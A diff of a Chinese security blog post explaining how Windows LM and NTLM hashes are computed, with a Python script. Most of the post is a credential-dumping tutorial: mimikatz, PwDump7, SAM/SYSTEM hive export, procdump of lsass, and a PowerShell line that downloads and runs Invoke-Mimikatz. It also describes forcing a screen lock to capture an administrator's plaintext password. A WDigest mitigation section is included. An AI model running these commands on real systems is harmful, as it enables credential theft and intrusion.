@@ -291,7 +291,7 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>6.5k</span>
+              <span>6.4k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
@@ -311,147 +311,193 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <br>
-
-<h3 id="Windows-Hash"><a href="#Windows-Hash" class="headerlink" title="Windows Hash"></a>Windows Hash</h3><h4 id="LM-Hash"><a href="#LM-Hash" class="headerlink" title="LM Hash"></a>LM Hash</h4><p>LAN Manager (LM) Hash 时WIndows 系统所用的第一种密码哈希算法，本质为DES加密</p>
-<h5 id="LM-Hash-生成原理"><a href="#LM-Hash-生成原理" class="headerlink" title="LM Hash 生成原理"></a>LM Hash 生成原理</h5><ul>
-<li><p>1.用户密码转换为大写，最大长度限制为14个字符，</p>
-</li>
-<li><p>2.密码转换为16进制字符串，不足14个字节将用0来补全</p>
-</li>
-<li><p>3.密码的16进制被分成两个7byte部分，每部分转换成比特流，并且长度为为56bit，长度不足则在左边用0补齐</p>
-</li>
-<li><p>4.再分为7bit为一组，每组末尾加0，再组成一组</p>
-</li>
-<li><p>5.将以上步骤得到的两组8字节编码，分别作为DES加密key为魔术字符串“KGS!@#$% ”进行加密</p>
-</li>
+        <p><br></p>
+<h3 id="windows-hash">Windows Hash</h3>
+<h4 id="lm-hash">LM Hash</h4>
+<p>LAN Manager (LM) Hash 时WIndows
+系统所用的第一种密码哈希算法，本质为DES加密</p>
+<h5 id="lm-hash-生成原理">LM Hash 生成原理</h5>
+<ul>
+<li><p>1.用户密码转换为大写，最大长度限制为14个字符，</p></li>
+<li><p>2.密码转换为16进制字符串，不足14个字节将用0来补全</p></li>
+<li><p>3.密码的16进制被分成两个7byte部分，每部分转换成比特流，并且长度为为56bit，长度不足则在左边用0补齐</p></li>
+<li><p>4.再分为7bit为一组，每组末尾加0，再组成一组</p></li>
+<li><p>5.将以上步骤得到的两组8字节编码，分别作为DES加密key为魔术字符串“KGS!@#$%
+”进行加密</p></li>
 </ul>
-<br>
-
-<p>参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/endeav_or/article/details/50196325">https://blog.csdn.net/endeav_or/article/details/50196325</a></p>
+<p><br></p>
+<p>参考https://blog.csdn.net/endeav_or/article/details/50196325</p>
 <p>以这篇文字给出的 123994 为例</p>
-<p>将 123994 使用文本编辑器 转换为十六进制 </p>
+<p>将 123994 使用文本编辑器 转换为十六进制</p>
 <p><img src="/posts/11da9eaf/LM-Hash1.png"></p>
-<p>转换后 为 <code>313233393934</code> (12*4 bits) 而为了满足14字节(14 * 8 bits) 后续全都用0补全</p>
-<p>所以 补全后的十六进制为 <code>3132333939340000 0000000000000000</code></p>
-<p>将以上编码分词2组7字节(7*8 bits)   <code>3132333939340000</code>  <code>0000000000000000</code></p>
-<p>将以上两组7字节的十六进制转换为 二进制，每7bit 一组末尾加0，再转换为十六进制组成的两组8字节的编码</p>
+<p>转换后 为 <code>313233393934</code> (12*4 bits) 而为了满足14字节(14 *
+8 bits) 后续全都用0补全</p>
+<p>所以 补全后的十六进制为
+<code>3132333939340000 0000000000000000</code></p>
+<p>将以上编码分词2组7字节(7*8 bits) <code>3132333939340000</code>
+<code>0000000000000000</code></p>
+<p>将以上两组7字节的十六进制转换为 二进制，每7bit
+一组末尾加0，再转换为十六进制组成的两组8字节的编码</p>
 <p><code>31323339393400</code> 转换为 二进制位</p>
-<p><code>00110001001100100011001100111001001110010011010000000000</code> 长度不足便在左边补0 这里从计算器复制过来没有前面两个0</p>
-<p><code>0011000  1001100  1000110  0110011  1001001  1100100  1101000 0000000</code> 每7位分为一组</p>
-<p><code>00110000  10011000  10001100  01100110  10010010  11001000  11010000 00000000 </code>  每一组末尾补0</p>
+<p><code>00110001001100100011001100111001001110010011010000000000</code>
+长度不足便在左边补0 这里从计算器复制过来没有前面两个0</p>
+<p><code>0011000  1001100  1000110  0110011  1001001  1100100  1101000 0000000</code>
+每7位分为一组</p>
+<p><code>00110000  10011000  10001100  01100110  10010010  11001000  11010000 00000000</code>
+每一组末尾补0</p>
 <p>将每一组转换位十六进制</p>
-<p><code>00110000  10011000  1000110 001100110  10010010  11001000  11010000 00000000 </code></p>
-<p><code>30       98        8C        66        92         C8        D0        00 </code></p>
-<p>最终得到 <code>30988C6692C8D000</code>  同理 <code>00000000000000</code> (14个0 ) 得到 <code>0000000000000000</code>(16个0)</p>
-<p>最后再将 以上两组8字节编码 分别作为DES 加密的密钥 为 魔术字符串“KGS!@#$% ”进行加密</p>
+<p><code>00110000  10011000  1000110 001100110  10010010  11001000  11010000 00000000</code></p>
+<p><code>30       98        8C        66        92         C8        D0        00</code></p>
+<p>最终得到 <code>30988C6692C8D000</code> 同理
+<code>00000000000000</code> (14个0 ) 得到
+<code>0000000000000000</code>(16个0)</p>
+<p>最后再将 以上两组8字节编码 分别作为DES 加密的密钥 为
+魔术字符串“KGS!@#$% ”进行加密</p>
 <p>该魔术字符串转换为16进制为 <code>4B47532140232425</code></p>
 <p><img src="/posts/11da9eaf/KGS.png"></p>
-<p>将两组DES加密后的编码拼接，<br>得到最终LM-Hash值为：<br>FAE8BB9ECB799902 AAD3B435B51404EE</p>
+<p>将两组DES加密后的编码拼接， 得到最终LM-Hash值为： FAE8BB9ECB799902
+AAD3B435B51404EE</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python实现LM-HASH脚本</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> pyDes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DesEncrypt</span>(<span class="params"><span class="built_in">str</span>, Des_Key</span>):</span><br><span class="line">    k = des(Des_Key, ECB, pad=<span class="literal">None</span>)</span><br><span class="line">    EncryptStr = k.encrypt(<span class="built_in">str</span>)</span><br><span class="line">    <span class="keyword">return</span> binascii.b2a_hex(EncryptStr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Zero_padding</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">    b = []</span><br><span class="line">    l = <span class="built_in">len</span>(<span class="built_in">str</span>)</span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">        <span class="keyword">if</span> (num &lt; <span class="number">8</span>) <span class="keyword">and</span> n % <span class="number">7</span> == <span class="number">0</span>:</span><br><span class="line">            b.append(<span class="built_in">str</span>[n:n + <span class="number">7</span>] + <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">            num = num + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(b)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    test_str = <span class="string">&quot;123994&quot;</span></span><br><span class="line">    <span class="comment"># 用户的密码转换为大写,并转换为16进制字符串</span></span><br><span class="line">    test_str = test_str.upper().encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">    str_len = <span class="built_in">len</span>(test_str)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 密码不足14字节将会用0来补全</span></span><br><span class="line">    <span class="keyword">if</span> str_len &lt; <span class="number">28</span>:</span><br><span class="line">        test_str = test_str.ljust(<span class="number">28</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 固定长度的密码被分成两个7byte部分</span></span><br><span class="line">    t_1 = test_str[<span class="number">0</span>:<span class="built_in">len</span>(test_str) / <span class="number">2</span>]</span><br><span class="line">    t_2 = test_str[<span class="built_in">len</span>(test_str) / <span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 每部分转换成比特流，并且长度位56bit，长度不足使用0在左边补齐长度</span></span><br><span class="line">    t_1 = <span class="built_in">bin</span>(<span class="built_in">int</span>(t_1, <span class="number">16</span>)).lstrip(<span class="string">&#x27;0b&#x27;</span>).rjust(<span class="number">56</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    t_2 = <span class="built_in">bin</span>(<span class="built_in">int</span>(t_2, <span class="number">16</span>)).lstrip(<span class="string">&#x27;0b&#x27;</span>).rjust(<span class="number">56</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 再分7bit为一组末尾加0，组成新的编码</span></span><br><span class="line">    t_1 = Zero_padding(t_1)</span><br><span class="line">    t_2 = Zero_padding(t_2)</span><br><span class="line">    <span class="built_in">print</span> t_1</span><br><span class="line">    t_1 = <span class="built_in">hex</span>(<span class="built_in">int</span>(t_1, <span class="number">2</span>))</span><br><span class="line">    t_2 = <span class="built_in">hex</span>(<span class="built_in">int</span>(t_2, <span class="number">2</span>))</span><br><span class="line">    t_1 = t_1[<span class="number">2</span>:].rstrip(<span class="string">&#x27;L&#x27;</span>)</span><br><span class="line">    t_2 = t_2[<span class="number">2</span>:].rstrip(<span class="string">&#x27;L&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;0&#x27;</span> == t_2:</span><br><span class="line">        t_2 = <span class="string">&quot;0000000000000000&quot;</span></span><br><span class="line">    t_1 = binascii.a2b_hex(t_1)</span><br><span class="line">    t_2 = binascii.a2b_hex(t_2)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 上步骤得到的8byte二组，分别作为DES key为&quot;KGS!@#$%&quot;进行加密。</span></span><br><span class="line">    LM_1 = DesEncrypt(<span class="string">&quot;KGS!@#$%&quot;</span>, t_1)</span><br><span class="line">    LM_2 = DesEncrypt(<span class="string">&quot;KGS!@#$%&quot;</span>, t_2)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将二组DES加密后的编码拼接，得到最终LM HASH值。</span></span><br><span class="line">    LM = LM_1 + LM_2</span><br><span class="line">    <span class="built_in">print</span> LM</span><br></pre></td></tr></table></figure>
-
-<h5 id="LM-Hash-缺点"><a href="#LM-Hash-缺点" class="headerlink" title="LM Hash 缺点"></a>LM Hash 缺点</h5><p>1.密码长度最大只能为14个字符</p>
+<h5 id="lm-hash-缺点">LM Hash 缺点</h5>
+<p>1.密码长度最大只能为14个字符</p>
 <p>2.密码无法区分大小写</p>
-<p>3.如果密码强度小于7位，那个第二个分组加密后的结果一定为 aad3b435b51404ee</p>
+<p>3.如果密码强度小于7位，那个第二个分组加密后的结果一定为
+aad3b435b51404ee</p>
 <p>4.Des 容易被破解 密码强度不高</p>
-<br>
-
-<p>在Windows Vista 和 Windows Server 2008 版本后 Windows默认禁用了LM Hash。LM-Hash 明文密码限制在14位以内，也就是说，如果LM Hash被禁用了，攻击者通过工具抓取的LM Hash 通常为 aad3b435b51404eeaad3b435b51404ee</p>
-<br>
-
-<h4 id="NTLM-Hash"><a href="#NTLM-Hash" class="headerlink" title="NTLM Hash"></a>NTLM Hash</h4><p>NT LAN Manager (NTML) Hash  是基于MD4算法。从Windows Vista/Windows Server 2003以后Windows的默认认证方式均为NTLM Hash</p>
-<h5 id="NTLM-Hash生成原理"><a href="#NTLM-Hash生成原理" class="headerlink" title="NTLM Hash生成原理"></a>NTLM Hash生成原理</h5><p>1.将用户密码（转为ASCII 再）转换为十六进制</p>
+<p><br></p>
+<p>在Windows Vista 和 Windows Server 2008 版本后 Windows默认禁用了LM
+Hash。LM-Hash 明文密码限制在14位以内，也就是说，如果LM
+Hash被禁用了，攻击者通过工具抓取的LM Hash 通常为
+aad3b435b51404eeaad3b435b51404ee</p>
+<p><br></p>
+<h4 id="ntlm-hash">NTLM Hash</h4>
+<p>NT LAN Manager (NTML) Hash 是基于MD4算法。从Windows Vista/Windows
+Server 2003以后Windows的默认认证方式均为NTLM Hash</p>
+<h5 id="ntlm-hash生成原理">NTLM Hash生成原理</h5>
+<p>1.将用户密码（转为ASCII 再）转换为十六进制</p>
 <p>2.将十六进制格式的密码进行Unicode编码</p>
 <p>3.使用MD4摘要算法对Unicode编码数据进行Hash计算</p>
-<br>
-
+<p><br></p>
 <p>以密码123456为例 ，</p>
 <ul>
-<li>首先将密码字符串转换为ASCII字符串，123456 =&gt; 49 50 51 52 53 54</li>
-<li>ASCII字符串在转换为十六进制，49 50 51 52 53 54 =&gt; 31 32 33 34 35 36 </li>
-<li>再进行Unicode 编码， 31 32 33 34 35 36 =&gt; </li>
+<li>首先将密码字符串转换为ASCII字符串，123456 =&gt; 49 50 51 52 53
+54</li>
+<li>ASCII字符串在转换为十六进制，49 50 51 52 53 54 =&gt; 31 32 33 34 35
+36</li>
+<li>再进行Unicode 编码， 31 32 33 34 35 36 =&gt;</li>
 </ul>
-<br>
-
+<p><br></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib,binascii;</span><br><span class="line"><span class="built_in">print</span> binascii.hexlify(hashlib.new(<span class="string">&quot;md4&quot;</span>, <span class="string">&quot;123456&quot;</span>.encode(<span class="string">&quot;utf-16le&quot;</span>)).digest())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 123456 </span></span><br><span class="line"><span class="comment"># 32ed87bdb5fdc5e9cba88547376818d4</span></span><br></pre></td></tr></table></figure>
-
-<br>
-
-<h3 id="密码抓取"><a href="#密码抓取" class="headerlink" title="密码抓取"></a>密码抓取</h3><h4 id="GetPassword"><a href="#GetPassword" class="headerlink" title="GetPassword"></a>GetPassword</h4><p>直接使用管理员权限的cmd 运行 GetPassword.exe 即可</p>
+<p><br></p>
+<h3 id="密码抓取">密码抓取</h3>
+<h4 id="getpassword">GetPassword</h4>
+<p>直接使用管理员权限的cmd 运行 GetPassword.exe 即可</p>
 <p><img src="/posts/11da9eaf/GetPassword.png"></p>
-<h4 id="PwDump7"><a href="#PwDump7" class="headerlink" title="PwDump7"></a>PwDump7</h4><p>可以得到系统中所有庄户的NTML Hash </p>
+<h4 id="pwdump7">PwDump7</h4>
+<p>可以得到系统中所有庄户的NTML Hash</p>
 <p><img src="/posts/11da9eaf/PwDUmp7.png"></p>
-<h4 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h4><p>下载地址:<a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz/releases">https://github.com/gentilkiwi/mimikatz/releases</a></p>
-<p>Minikatz 用于Windows下读取已经登录过的用户的Hash 和明文密码，需要admin或者system权限</p>
-<h5 id="本地交互式抓取"><a href="#本地交互式抓取" class="headerlink" title="本地交互式抓取"></a>本地交互式抓取</h5><p><code>mimikatz # privilege::debug</code> 提升权限</p>
+<h4 id="mimikatz">mimikatz</h4>
+<p>下载地址:https://github.com/gentilkiwi/mimikatz/releases</p>
+<p>Minikatz 用于Windows下读取已经登录过的用户的Hash
+和明文密码，需要admin或者system权限</p>
+<h5 id="本地交互式抓取">本地交互式抓取</h5>
+<p><code>mimikatz # privilege::debug</code> 提升权限</p>
 <p><code>mimikatz # log</code> 启动日志记录功能</p>
-<p><code>mimikatz # sekurlsa::logonpasswords</code> 读取存储在计算机上的明文密码和Hash值</p>
-<h5 id="本地非交互式抓取"><a href="#本地非交互式抓取" class="headerlink" title="本地非交互式抓取"></a>本地非交互式抓取</h5><p><code>mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; exit &gt; mimikatz.txt</code></p>
-<h4 id="powershell-加载-mimikatz抓取"><a href="#powershell-加载-mimikatz抓取" class="headerlink" title="powershell 加载 mimikatz抓取"></a>powershell 加载 mimikatz抓取</h4><p>可以连接外网情况下</p>
-<p><code>powershell IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#39;); Invoke-Mimikatz</code></p>
+<p><code>mimikatz # sekurlsa::logonpasswords</code>
+读取存储在计算机上的明文密码和Hash值</p>
+<h5 id="本地非交互式抓取">本地非交互式抓取</h5>
+<p><code>mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit &gt; mimikatz.txt</code></p>
+<h4 id="powershell-加载-mimikatz抓取">powershell 加载 mimikatz抓取</h4>
+<p>可以连接外网情况下</p>
+<p><code>powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz</code></p>
 <p>内网情况下，可以搭建一个本地web服务器，使用内网ip去访问</p>
-<p><code>powershell IEX (New-Object Net.WebClient).DownloadString(&#39;http://10.10.0.137/Invoke-Mimikatz.ps1&#39;); Invoke-Mimikatz</code></p>
-<br>
-
-<h4 id="通过SAM-和-System-文件抓取密码"><a href="#通过SAM-和-System-文件抓取密码" class="headerlink" title="通过SAM 和 System 文件抓取密码"></a>通过SAM 和 System 文件抓取密码</h4><p>导出SAM 文件和 System 文件<br><code>reg save hklm\sam sam.hive</code><br><code>reg save hklm\system system.hive</code><br>然后将这两个文件放到mimikatz的同目录下，运行mmimikatz<br><code>lsadump::sam /sam:sam.hive /system:system.hive</code><br><img src="/posts/11da9eaf/sam_system_hash.png"><br>得到NTLM为<code>31d6cfe0d16ae931b73c59d7e0c089c0</code><br>在网站上进行解密<br><img src="/posts/11da9eaf/cmd5_NTLM.png"><br>得到密码为空 （该机器密码在设置时设为了空）</p>
-<p>也可以使用ophcrack （<a target="_blank" rel="noopener" href="https://www.objectif-securite.ch/ophcrack%EF%BC%89">https://www.objectif-securite.ch/ophcrack）</a></p>
+<p><code>powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.0.137/Invoke-Mimikatz.ps1'); Invoke-Mimikatz</code></p>
+<p><br></p>
+<h4 id="通过sam-和-system-文件抓取密码">通过SAM 和 System
+文件抓取密码</h4>
+<p>导出SAM 文件和 System 文件 <code>reg save hklm\sam sam.hive</code>
+<code>reg save hklm\system system.hive</code>
+然后将这两个文件放到mimikatz的同目录下，运行mmimikatz
+<code>lsadump::sam /sam:sam.hive /system:system.hive</code> <img src="/posts/11da9eaf/sam_system_hash.png">
+得到NTLM为<code>31d6cfe0d16ae931b73c59d7e0c089c0</code> 在网站上进行解密
+<img src="/posts/11da9eaf/cmd5_NTLM.png"> 得到密码为空
+（该机器密码在设置时设为了空）</p>
+<p>也可以使用ophcrack （https://www.objectif-securite.ch/ophcrack）</p>
 <p><img src="/posts/11da9eaf/ophcrack.png"></p>
-<p>适用场景：获得了system权限，但是无法在目标机器上上传或使用 Mimikatz，这时候就可以使用reg命令导出Sam和System文件 然后离线读取处NTML Hash 。可以考虑使用在线解密网站或者hash 传递方式得到明文。</p>
-<br>
-
-<h4 id="使用Powershell进行Dump-Hashs"><a href="#使用Powershell进行Dump-Hashs" class="headerlink" title="使用Powershell进行Dump Hashs"></a>使用Powershell进行Dump Hashs</h4><p>………………………</p>
-<h4 id="ProcDump-mimikatz"><a href="#ProcDump-mimikatz" class="headerlink" title="ProcDump + mimikatz"></a>ProcDump + mimikatz</h4><p>ProcDump 是一个命令行程序，可以很方便地将系统正在运行的进程转存储生成为 dump 文件,是一款微软自家出品软件，所以可以过很多杀软。</p>
-<h5 id="dump-lsass-exe-进程"><a href="#dump-lsass-exe-进程" class="headerlink" title="dump lsass.exe 进程"></a>dump lsass.exe 进程</h5><p>打开任务管理器 找到 lsass.exe(Local Security Authority Process) 进程，选择创建转储文件</p>
+<p>适用场景：获得了system权限，但是无法在目标机器上上传或使用
+Mimikatz，这时候就可以使用reg命令导出Sam和System文件 然后离线读取处NTML
+Hash 。可以考虑使用在线解密网站或者hash 传递方式得到明文。</p>
+<p><br></p>
+<h4 id="使用powershell进行dump-hashs">使用Powershell进行Dump Hashs</h4>
+<p>...........................</p>
+<h4 id="procdump-mimikatz">ProcDump + mimikatz</h4>
+<p>ProcDump
+是一个命令行程序，可以很方便地将系统正在运行的进程转存储生成为 dump
+文件,是一款微软自家出品软件，所以可以过很多杀软。</p>
+<h5 id="dump-lsass.exe-进程">dump lsass.exe 进程</h5>
+<p>打开任务管理器 找到 lsass.exe(Local Security Authority Process)
+进程，选择创建转储文件</p>
 <p><img src="/posts/11da9eaf/dump_lsass.png"></p>
 <p><img src="/posts/11da9eaf/dump_lsass2.png"></p>
-<p>这里生成的位置在AppData\Local 下 如果没显示该文件目录 点击组织-&gt;文件夹和搜索选项-&gt;查看 将显示的隐藏文件、文件夹和驱动器前点勾</p>
+<p>这里生成的位置在AppData下 如果没显示该文件目录
+点击组织-&gt;文件夹和搜索选项-&gt;查看
+将显示的隐藏文件、文件夹和驱动器前点勾</p>
 <p><img src="/posts/11da9eaf/dump_lsass3.png"></p>
 <p>使用procdump.exe 导出lsass.exe</p>
 <p><code>Procdump.exe -accepteula -ma lsass.exe lsass.dmp</code></p>
-<h5 id="读取dump文件"><a href="#读取dump文件" class="headerlink" title="读取dump文件"></a>读取dump文件</h5><p>然后将生成的 lsass.dmp 文件放到 mimikatz 的同目录下，运行mimikatz</p>
-<p>直接读取明文密码 </p>
-<p><code>mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::tspkg&quot; exit</code></p>
+<h5 id="读取dump文件">读取dump文件</h5>
+<p>然后将生成的 lsass.dmp 文件放到 mimikatz 的同目录下，运行mimikatz</p>
+<p>直接读取明文密码</p>
+<p><code>mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::tspkg" exit</code></p>
 <p>读取明文密码和hash 值(显示的信息更全)</p>
-<p><code>mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords&quot; exit</code></p>
-<h4 id="部分系统的抓取尝试"><a href="#部分系统的抓取尝试" class="headerlink" title="部分系统的抓取尝试"></a>部分系统的抓取尝试</h4><h5 id="Windows-Server-2008-R2"><a href="#Windows-Server-2008-R2" class="headerlink" title="Windows Server 2008 R2"></a>Windows Server 2008 R2</h5><p><img src="/posts/11da9eaf/mimikatz_winserver2008.png"></p>
-<h5 id="Windows7-x64"><a href="#Windows7-x64" class="headerlink" title="Windows7 x64"></a>Windows7 x64</h5><p><img src="/posts/11da9eaf/mimikatz_win7.png"></p>
+<p><code>mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords" exit</code></p>
+<h4 id="部分系统的抓取尝试">部分系统的抓取尝试</h4>
+<h5 id="windows-server-2008-r2">Windows Server 2008 R2</h5>
+<p><img src="/posts/11da9eaf/mimikatz_winserver2008.png"></p>
+<h5 id="windows7-x64">Windows7 x64</h5>
+<p><img src="/posts/11da9eaf/mimikatz_win7.png"></p>
 <p>这里抓取的密码为空 因为原密码为空 看下抓取的NTLM值 与 空值的相同</p>
-<br>
-
-<h3 id="防范措施"><a href="#防范措施" class="headerlink" title="防范措施"></a>防范措施</h3><p>安装 KB2871997 补丁，关闭Wdigest功能(Windows Server 2012以上版本都是默认关闭的)</p>
-<p>安装完该补丁后，系统默认禁用 Wdigest Auth ，内存（lsass进程）不再保存明文口令。Mimikatz 将读不到密码明文。</p>
-<p>通过擦好看注册表键值，可以判断Wdigest功能状态，如果该值为 1 则为开启，即可获取明文密码，如果改值为0 则明文密码就不会出现在内存中。</p>
+<p><br></p>
+<h3 id="防范措施">防范措施</h3>
+<p>安装 KB2871997 补丁，关闭Wdigest功能(Windows Server
+2012以上版本都是默认关闭的)</p>
+<p>安装完该补丁后，系统默认禁用 Wdigest Auth
+，内存（lsass进程）不再保存明文口令。Mimikatz 将读不到密码明文。</p>
+<p>通过擦好看注册表键值，可以判断Wdigest功能状态，如果该值为 1
+则为开启，即可获取明文密码，如果改值为0
+则明文密码就不会出现在内存中。</p>
 <p>开启或关闭Wdigest 的命令:</p>
 <p>（1） reg add 命令</p>
-<p>开启Wdigest Auth    </p>
+<p>开启Wdigest Auth</p>
 <p><code>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</code></p>
 <p>关闭Wdigest Auth</p>
 <p><code>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f</code></p>
-<p> （2）使用powershell</p>
+<p>（2）使用powershell</p>
 <p>开启Wdigest Auth</p>
 <p><code>Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1</code></p>
 <p>关闭Wdigest Auth</p>
 <p><code>Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 0</code></p>
-<p>(3) 利用meterpreter</p>
+<ol start="3" type="1">
+<li>利用meterpreter</li>
+</ol>
 <p>开启Wdigest Auth</p>
 <p><code>reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogonCredential -t REG_DWORD -d 1</code></p>
 <p>关闭Wdigest Auth</p>
 <p><code>reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogonCredential -t REG_DWORD -d 0</code></p>
-<br>
-
-<p>记录一位师傅文章的思路(<a target="_blank" rel="noopener" href="https://github.com/x0rz4/Intranet-information">https://github.com/x0rz4/Intranet-information</a>)</p>
+<p><br></p>
+<p>记录一位师傅文章的思路(https://github.com/x0rz4/Intranet-information)</p>
 <p>拿到了admin的cmd权限，管理员使用密码登录了机器，开启了lsass.exe进程，把密码保存在了内存文件lsass进程中。</p>
-<p>想要的抓取明文，修改注册表开启Wdigest ，然后利用cmd的强制锁屏，等待管理员重新输入密码登录系统，这样密码就被记录在了lsass内存文件中，然后使用procdump导出lsass.dmp，使用mimikatz进行读取明文和hash</p>
+<p>想要的抓取明文，修改注册表开启Wdigest
+，然后利用cmd的强制锁屏，等待管理员重新输入密码登录系统，这样密码就被记录在了lsass内存文件中，然后使用procdump导出lsass.dmp，使用mimikatz进行读取明文和hash</p>
 <p>强制锁屏命令:</p>
 <p>cmd <code>rundll32 user32.dll,LockWorkStation</code></p>
-<br>
-
-<br>
-
-<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
-<p><a target="_blank" rel="noopener" href="https://www.sqlsec.com/2019/11/winhash.html">https://www.sqlsec.com/2019/11/winhash.html</a></p>
-<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2445">https://xz.aliyun.com/t/2445</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/endeav_or/article/details/50196325">https://blog.csdn.net/endeav_or/article/details/50196325</a></p>
+<p><br></p>
+<p><br></p>
+<h3 id="reference">Reference</h3>
+<blockquote>
+<p>https://www.sqlsec.com/2019/11/winhash.html</p>
+<p>https://xz.aliyun.com/t/2445</p>
+<p>https://blog.csdn.net/endeav_or/article/details/50196325</p>
 </blockquote>
 
     </div>
@@ -582,7 +628,8 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows-Hash"><span class="nav-number">1.</span> <span class="nav-text">Windows Hash</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#LM-Hash"><span class="nav-number">1.1.</span> <span class="nav-text">LM Hash</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#LM-Hash-%E7%94%9F%E6%88%90%E5%8E%9F%E7%90%86"><span class="nav-number">1.1.1.</span> <span class="nav-text">LM Hash 生成原理</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#LM-Hash-%E7%BC%BA%E7%82%B9"><span class="nav-number">1.1.2.</span> <span class="nav-text">LM Hash 缺点</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#NTLM-Hash"><span class="nav-number">1.2.</span> <span class="nav-text">NTLM Hash</span></a><ol 